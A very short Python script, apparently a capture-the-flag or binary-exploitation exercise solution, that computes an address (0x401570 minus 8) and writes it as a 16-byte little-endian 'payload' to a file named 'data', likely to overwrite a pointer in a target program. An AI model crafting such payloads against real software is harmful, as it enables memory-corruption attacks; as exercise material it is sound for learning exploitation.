#!/usr/bin/env python3

payload = 0x401570 - 0x8

with open("data", 'wb') as data:
    data.write(payload.to_bytes(0x10, 'little'))
